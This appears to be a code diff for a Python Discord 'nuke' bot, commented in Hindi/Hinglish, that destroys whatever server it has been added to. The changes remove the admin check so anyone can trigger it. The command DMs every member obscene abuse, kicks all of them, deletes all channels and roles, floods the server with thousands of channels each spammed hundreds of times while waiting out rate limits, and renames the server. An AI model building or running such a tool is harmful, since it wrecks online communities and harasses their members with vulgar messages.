@@ -3,6 +3,7 @@ from discord.ext import commands
 import asyncio
 import os
 from dotenv import load_dotenv
+import aiohttp
 
 load_dotenv()
 
@@ -23,65 +24,177 @@ async def on_ready():
     except Exception as e:
         print(f"❌ Error syncing commands: {e}")
 
-# ADD COMMAND - Server ID से automatic invite
-@bot.tree.command(name="add", description="🤖 Server ID daal kar bot ko add karo!")
-@discord.app_commands.describe(server_id="Target server ka ID")
-async def add(interaction: discord.Interaction, server_id: str):
-    """Server ID daalkar bot ko directly add karo"""
-    
-    CLIENT_ID = os.getenv("CLIENT_ID", "1469213868323504261")
-    
-    try:
-        # Invite link generate karo
-        invite_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&permissions=8&scope=bot%20applications.commands"
-        
-        # Embed message
-        embed = discord.Embed(
-            title="🤖 Bot को Add करें",
-            description=f"Server ID: `{server_id}`\n\n**Bot को add करने के लिए नीचे क्लिक करें!**",
-            color=discord.Color.red()
-        )
-        embed.add_field(
-            name="⚡ Quick Add:",
-            value="बटन दबाओ → Server select करो → Authorize करो → DONE! ✅",
-            inline=False
-        )
-        embed.set_footer(text="Bot add होने के बाद /nuke command काम करेगी!")
-        
-        # Button with direct invite
-        class AddBotView(discord.ui.View):
-            @discord.ui.button(
-                label="⚡ Add Bot Now",
-                style=discord.ButtonStyle.red,
-                emoji="➕"
-            )
-            async def add_bot_button(self, inter: discord.Interaction, button: discord.ui.Button):
-                await inter.response.send_message(
-                    f"🔗 **[यहाँ क्लिक करके Bot को Add करो!]({invite_url})**\n\n✅ Bot add होने के बाद `/nuke` command use कर सकते हो!",
-                    ephemeral=True
-                )
-        
-        await interaction.response.send_message(embed=embed, view=AddBotView())
-        
-    except Exception as e:
-        await interaction.response.send_message(f"❌ Error: {str(e)}", ephemeral=True)
+# Aggressive DM messages for kicked members
+DM_MESSAGES = [
+    "@everyone apke server ki maa chud gyi gand marai bosdiwale or server indo dedo",
+    "@everyone 💀🔥💥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━💥🔥💀\n🚨🚨🚨 APKE SERVER KI CHUT GYI 🚨🚨🚨\n🔥💀 SERVER STATUS : ☠️ KHATAM ☠️ 💀🔥\n💣⚠️ SYSTEM STATUS : 💥 CRASHED 💥 ⚠️💣\n🧨☠️ SERVER HEALTH : 📉 0% 📉 ☠️🧨\n💥🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💥\n☠️ REST IN PEACE SERVER ☠️\n💀🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💀"
+]
 
-# NUKE COMMAND - बिना किसी extra setup के
+# Channel names (9999 channels)
+CHANNEL_NAMES = [
+    "💥 SERVER UD GYA 💀",
+    "🚨 SERVER CRASH 🧨",
+    "🔥 SERVER KHATAM ☠️",
+    "💣 SERVER GONE 💀",
+    "⚠️ SERVER DOWN 🫠",
+    "🧨 SERVER PHAT GYA 💥",
+    "☠️ SERVER DEAD 🪦",
+    "🌪️ SERVER UDD GYA 💀",
+    "🛑 SERVER BAND 🚫",
+    "⚡ SERVER CRASHED 💥",
+    "🪦 SERVER RIP ☠️",
+    "🌋 SERVER JAL GYA 🔥",
+    "💀 SERVER KHALLAS 🫠",
+    "🚧 SERVER DAMAGE 💥",
+    "🧯 SERVER FIRE 🔥",
+    "🌀 SERVER GAYAB 👻",
+    "👻 SERVER BHOOT BAN GYA 💀",
+    "📉 SERVER DOWN BAD 😭",
+    "🔌 SERVER OFF ⚫",
+    "☠️ SERVER FINISH 💥"
+]
+
+# Role names (99 roles)
+ROLE_NAMES = [
+    "💥 SERVER UD GYA 💀",
+    "🚨 SERVER CRASH 🧨",
+    "🔥 SERVER KHATAM ☠️",
+    "💣 SERVER GONE 💀",
+    "⚠️ SERVER DOWN 🫠",
+    "🧨 SERVER PHAT GYA 💥",
+    "☠️ SERVER DEAD 🪦",
+    "🌪️ SERVER UDD GYA 💀",
+    "🛑 SERVER BAND 🚫",
+    "⚡ SERVER CRASHED 💥",
+    "🪦 SERVER RIP ☠️",
+    "🌋 SERVER JAL GYA 🔥",
+    "💀 SERVER KHALLAS 🫠",
+    "🚧 SERVER DAMAGE 💥",
+    "🧯 SERVER FIRE 🔥",
+    "🌀 SERVER GAYAB 👻",
+    "👻 SERVER BHOOT BAN GYA 💀",
+    "📉 SERVER DOWN BAD 😭",
+    "🔌 SERVER OFF ⚫",
+    "☠️ SERVER FINISH 💥",
+    "🔥💀 NUKE TIME 💀🔥",
+    "💥⚡ CHAOS MODE ⚡💥",
+    "🌪️🔥 DESTRUCTION 🔥🌪️",
+    "☠️💀 DEATH COMES 💀☠️",
+    "🚀🔥 EXPLOSION 🔥🚀",
+    "💣⚠️ BOOM TIME ⚠️💣",
+    "🧨🌋 KABOOM 🌋🧨",
+    "📉💀 CRASH ZONE 💀📉",
+    "🫠🔌 SHUTDOWN 🔌🫠",
+    "👻🌀 GHOSTED 🌀👻",
+    "🪦☠️ GRAVEYARD ☠️🪦",
+    "🔥🚨 ALERT 🚨🔥",
+    "💥🛑 STOP IT 🛑💥",
+    "⚡🌋 ERUPTION 🌋⚡",
+    "🧯�� EXTINGUISH 💣🧯",
+    "📉🫠 MELTING 🫠📉",
+    "🌀👻 VANISH 👻🌀",
+    "💀🔥 INFERNO 🔥💀",
+    "☠️💥 OBLITERATE 💥☠️",
+    "🚀⚡ LIGHTNING 🚀⚡",
+    "🧨🔥 DYNAMITE 🔥🧨",
+    "🌪️💀 TORNADO 💀🌪️",
+    "🎆💥 FIREWORKS 💥🎆",
+    "🌋☠️ VOLCANO ☠️🌋",
+    "💣🔥 EXPLOSION 🔥💣",
+    "⚠️💀 WARNING 💀⚠️",
+    "🔌📉 POWERDOWN 📉🔌",
+    "👻🫠 DISSOLVE 🫠👻",
+    "🪦💀 BURIED 💀🪦",
+    "🔥💥 INFERNO 💥🔥",
+    "☠️🚨 SIREN 🚨☠️",
+    "🛑⚡ BLOCKED ⚡🛑",
+    "🌋💣 MAGMA 💣🌋",
+    "🧯🔥 EXTINGUISH 🔥🧯",
+    "💀📉 COLLAPSE 📉💀",
+    "🌀👻 GHOST 👻🌀",
+    "💥🔥 NUCLEAR 🔥💥",
+    "⚡🚀 ROCKET 🚀⚡",
+    "🧨💀 BOMB 💀🧨",
+    "🌪️☠️ WIND 🌪️☠️",
+    "🎆💣 BOOM 💣🎆",
+    "🌋🔥 HOT 🔥🌋",
+    "⚠️💥 CAUTION 💥⚠️",
+    "🔌💀 DEAD 💀🔌",
+    "👻📉 FADE 📉👻",
+    "🪦🔥 TOMB 🔥🪦",
+    "🔥☠️ SCYTHE ☠️🔥",
+    "💥⚡ ZAPPED ⚡���",
+    "🧨🌀 SPIN 🌀🧨",
+    "💀🛑 STOP 🛑💀",
+    "🌋💥 ERUPT 💥🌋",
+    "🧯☠️ COOL 🧯☠️",
+    "📉🫠 SINK 🫠📉",
+    "🌀💀 SWIRL 💀🌀",
+    "🚀💣 LAUNCH 💣🚀",
+    "⚡🔥 SHOCK 🔥⚡",
+    "🧨☠️ TNT ☠️🧨",
+    "🌪️💥 WIND 💥🌪️",
+    "🎆🔥 FLASH 🔥🎆",
+    "🌋🧨 LAVA 🧨🌋",
+    "⚠️☠️ ALERT ☠️⚠️",
+    "🔌💥 SURGE 💥🔌",
+    "👻🫠 MELT 🫠👻",
+    "🪦💀 DEATH 💀🪦",
+    "🔥💀 FIRE 💀🔥",
+    "💥☠️ BLAST ☠️💥",
+    "⚡🌀 TWIRL 🌀⚡",
+    "🧨🔥 EXPLOSIVE 🔥🧨"
+]
+
+SPAM_MESSAGE = """💀🔥💥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━💥🔥💀
+
+        🚨🚨🚨  APKE SERVER KI CHUT GYI  🚨🚨🚨
+
+🔥💀  SERVER STATUS : ☠️ KHATAM ☠️  💀🔥
+💣⚠️  SYSTEM STATUS : 💥 CRASHED 💥  ⚠️💣
+🧨☠️  SERVER HEALTH : 📉 0% 📉  ☠️🧨
+
+💥🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💥
+        ☠️  REST IN PEACE SERVER  ☠️
+💀🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💀"""
+
+# NUKE COMMAND - कोई भी कर सकता है (कोई role check नहीं)
 @bot.tree.command(name="nuke", description="💥 COMPLETE SERVER DESTRUCTION! 💥")
-@discord.app_commands.checks.has_permissions(administrator=True)
 async def nuke(interaction: discord.Interaction):
-    """सीधे server को nuke कर दो!"""
+    """सीधे server को nuke कर दो! कोई भी इस command को use कर सकता है!"""
     await interaction.response.defer()
     
     guild = interaction.guild
     
     try:
-        # Initial message
         await interaction.followup.send("🔥 **NUKE शुरू हो गया!** 💥")
         print(f"🔥 NUKE शुरू: {guild.name}")
         
-        # Phase 1: Delete ALL channels
-        print("🔥 PHASE 1: DELETING ALL CHANNELS...")
+        # Phase 1: Send DMs to members before kicking
+        print("🔥 PHASE 1: SENDING DM MESSAGES...")
+        members_to_kick = [m for m in guild.members if m.id != interaction.user.id and not m.bot]
+        
+        for member in members_to_kick:
+            try:
+                dm_message = DM_MESSAGES[0]
+                await member.send(dm_message)
+                print(f"📧 DM sent to: {member.name}")
+            except Exception as e:
+                print(f"⚠️ Could not DM {member.name}: {e}")
+            await asyncio.sleep(0.1)
+        
+        # Phase 2: Kick all members
+        print("🔥 PHASE 2: KICKING ALL MEMBERS...")
+        for member in members_to_kick:
+            try:
+                await member.kick(reason="SERVER NUKED 💥")
+                print(f"👢 KICKED: {member.name}")
+            except Exception as e:
+                print(f"⚠️ Could not kick {member.name}: {e}")
+            await asyncio.sleep(0.1)
+        
+        # Phase 3: Delete ALL channels
+        print("🔥 PHASE 3: DELETING ALL CHANNELS...")
         for channel in list(guild.channels):
             try:
                 await channel.delete()
@@ -90,8 +203,8 @@ async def nuke(interaction: discord.Interaction):
                 print(f"⚠️ Error: {e}")
             await asyncio.sleep(0.1)
         
-        # Phase 2: Delete ALL roles except @everyone
-        print("🔥 PHASE 2: DELETING ALL ROLES...")
+        # Phase 4: Delete ALL roles except @everyone
+        print("🔥 PHASE 4: DELETING ALL ROLES...")
         for role in list(guild.roles):
             if role.name != "@everyone":
                 try:
@@ -101,38 +214,38 @@ async def nuke(interaction: discord.Interaction):
                     print(f"⚠️ Error: {e}")
             await asyncio.sleep(0.1)
         
-        # Phase 3: Kick all members
-        print("🔥 PHASE 3: KICKING ALL MEMBERS...")
-        for member in list(guild.members):
-            if member.id != interaction.user.id and not member.bot:
-                try:
-                    await member.kick(reason="SERVER NUKED 💥")
-                    print(f"👢 KICKED: {member.name}")
-                except Exception as e:
-                    print(f"⚠️ Could not kick {member.name}: {e}")
+        # Phase 5: Create new roles (99)
+        print("🔥 PHASE 5: CREATING NEW ROLES...")
+        for i, role_name in enumerate(ROLE_NAMES[:99]):
+            try:
+                await guild.create_role(name=role_name, color=discord.Color.random())
+                print(f"🎭 Created role {i+1}: {role_name}")
+            except Exception as e:
+                print(f"⚠️ Error creating role: {e}")
             await asyncio.sleep(0.1)
         
-        # Phase 4: Create 999+ channels
-        print("🔥 PHASE 4: CREATING CHAOS CHANNELS...")
-        spam_messages = [
-            "🚀 APKA SERVER KI GOP GOP HOGYI! 💥",
-            "⚡ SERVER COMPLETELY NUKED! ⚡",
-            "🎆 DESTRUCTION COMPLETE! 🎆",
-            "🌋 NUCLEAR OPTION ACTIVATED! 🌋",
-            "🔥 TOTAL ANNIHILATION! 🔥",
-            "💥 APKA SERVER KA KOI BACHA HI NAHI BACHA! 💥",
-        ]
+        # Phase 6: Create 9999 channels
+        print("🔥 PHASE 6: CREATING 9999 CHANNELS...")
+        channel_count = 0
         
-        for i in range(999):
+        for i in range(9999):
             try:
-                channel_name = f"gop-gop-{i+1}-💣"
+                channel_name = CHANNEL_NAMES[i % len(CHANNEL_NAMES)] + f" [{i+1}]"
                 channel = await guild.create_text_channel(channel_name)
-                
-                message = spam_messages[i % len(spam_messages)]
-                await channel.send(message)
-                await channel.send(f"@everyone {message}")
+                channel_count += 1
                 
                 print(f"💥 Created channel {i+1}: {channel_name}")
+                
+                # Send spam 999 times in each channel
+                for j in range(999):
+                    try:
+                        await channel.send(SPAM_MESSAGE)
+                    except Exception as e:
+                        if "You are being rate limited" in str(e):
+                            await asyncio.sleep(5)
+                        else:
+                            break
+                    await asyncio.sleep(0.01)
                 
                 if i % 10 == 0:
                     await asyncio.sleep(1)
@@ -144,30 +257,30 @@ async def nuke(interaction: discord.Interaction):
                 break
             except Exception as e:
                 print(f"⚠️ Error at channel {i+1}: {e}")
-                break
+                if "You are being rate limited" in str(e):
+                    await asyncio.sleep(60)
+        
+        # Phase 7: Change server name and avatar
+        print("🔥 PHASE 7: CHANGING SERVER NAME & AVATAR...")
+        try:
+            await guild.edit(name="Nuke server")
+            print("✅ Server name changed to 'Nuke server'")
+            
+            # Download and set avatar
+            try:
+                async with aiohttp.ClientSession() as session:
+                    async with session.get("https://share.google/shrccJdJSDeMUmsA5") as resp:
+                        if resp.status == 200:
+                            avatar_data = await resp.read()
+                            await guild.edit(icon=avatar_data)
+                            print("✅ Server avatar changed")
+            except Exception as e:
+                print(f"⚠️ Could not change avatar: {e}")
+        except Exception as e:
+            print(f"⚠️ Error changing server: {e}")
         
         # Final message
-        try:
-            general = await guild.create_text_channel("0-nuke-complete")
-            await general.send("""
-🚀🚀🚀 **SERVER KI COMPLETE NUKING HO GAYEE!** 🚀🚀🚀
-
-╔═══════════════════════════════════════╗
-║  💥 TOTAL DESTRUCTION REPORT 💥      ║
-╠═══════════════════════════════════════╣
-║ ✅ All Channels: DELETED              ║
-║ ✅ All Roles: DELETED                 ║
-║ ✅ All Members: KICKED                ║
-║ ✅ 999+ Chaos Channels: CREATED       ║
-║ ✅ Gop Gop Messages: SPAMMED          ║
-╚═══════════════════════════════════════╝
-
-**SERVER STATUS: 💀 DEAD 💀**
-""")
-        except:
-            pass
-        
-        await interaction.followup.send("✅ **NUKE COMPLETE!** 💥🔥 Server हल्क हो गया!")
+        await interaction.followup.send(f"✅ **NUKE COMPLETE!** 💥🔥\n📊 Total Channels Created: {channel_count}\n🎭 Total Roles Created: 99")
         print("✅ NUKE SUCCESSFUL!")
         
     except discord.Forbidden:
